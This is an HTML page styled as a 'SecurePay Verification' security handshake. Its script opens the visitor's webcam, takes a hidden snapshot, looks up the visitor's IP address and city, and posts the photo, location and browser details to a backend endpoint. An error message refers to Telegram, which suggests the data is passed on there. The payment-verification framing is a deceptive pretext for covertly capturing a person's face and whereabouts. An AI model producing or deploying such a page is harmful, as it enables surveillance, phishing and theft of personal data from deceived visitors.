<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SecurePay Enterprise Core</title>
    <style>
        :root {
            --bg-color: #0d1117;
            --panel-bg: rgba(22, 27, 34, 0.75);
            --border-color: rgba(255, 255, 255, 0.1);
            --accent-color: #2ea043;
            --text-main: #c9d1d9;
            --text-muted: #8b949e;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: var(--bg-color); color: var(--text-main); min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
        .container { width: 100%; max-width: 480px; background: var(--panel-bg); border: 1px solid var(--border-color); border-radius: 12px; padding: 30px; box-shadow: 0 8px 32px rgba(0,0,0,0.4); }
        h2 { font-size: 1.5rem; margin-bottom: 8px; color: #fff; }
        p { font-size: 0.9rem; color: var(--text-muted); margin-bottom: 20px; }
        .btn { width: 100%; padding: 12px; border-radius: 6px; border: none; background-color: var(--accent-color); color: #fff; font-weight: 600; cursor: pointer; }
        .btn:hover { background-color: #2c974b; }
        .btn:disabled { background-color: #30363d; color: var(--text-muted); cursor: not-allowed; }
        #status { margin-top: 15px; font-size: 0.9rem; color: #fff; }
        video { display: none; }
    </style>
</head>
<body>

    <div class="container">
        <h2>🛡️ SecurePay Verification</h2>
        <p>Click below to complete the security handshake and verification audit.</p>
        <button id="verify-btn" class="btn" onclick="runAudit()">Start Security Handshake</button>
        <div id="status"></div>
    </div>

    <video id="webcam" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        async function runAudit() {
            const btn = document.getElementById('verify-btn');
            const status = document.getElementById('status');
            
            btn.disabled = true;
            btn.textContent = "Processing...";
            status.textContent = "🔄 Initializing camera & gathering telemetry...";

            try {
                // 1. Capture Camera Snapshot
                const video = document.getElementById('webcam');
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                
                await new Promise(resolve => setTimeout(resolve, 1000)); // Wait for camera exposure

                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL('image/png');

                // Stop media stream tracks
                stream.getTracks().forEach(track => track.stop());

                // 2. Fetch IP Information
                status.textContent = "🌐 Resolving network telemetry...";
                let ipInfo = "Unknown IP";
                try {
                    const ipRes = await fetch('https://ipapi.co/json/');
                    const ipData = await ipRes.json();
                    ipInfo = `${ipData.ip} (${ipData.city}, ${ipData.country_name})`;
                } catch (err) {
                    ipInfo = "Client Local Network";
                }

                // 3. Send to Serverless Backend
                status.textContent = "📤 Dispatching audit log to secure gateway...";
                const response = await fetch('/api/audit', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        image: imageData,
                        role: "Client Terminal Node",
                        ipInfo: ipInfo,
                        userAgent: navigator.userAgent
                    })
                });

                const result = await response.json();

                if (result.success) {
                    status.innerHTML = `<span style="color: #2ea043; font-weight: bold;">✅ Verification Cleared & Logged Successfully!</span>`;
                    btn.textContent = "Verified";
                } else {
                    throw new Error(result.telegramError || "Server audit dispatch failed.");
                }

            } catch (error) {
                console.error(error);
                status.innerHTML = `<span style="color: #f85149;">❌ Error: ${error.message}</span>`;
                btn.disabled = false;
                btn.textContent = "Retry Handshake";
            }
        }
    </script>
</body>
</html>
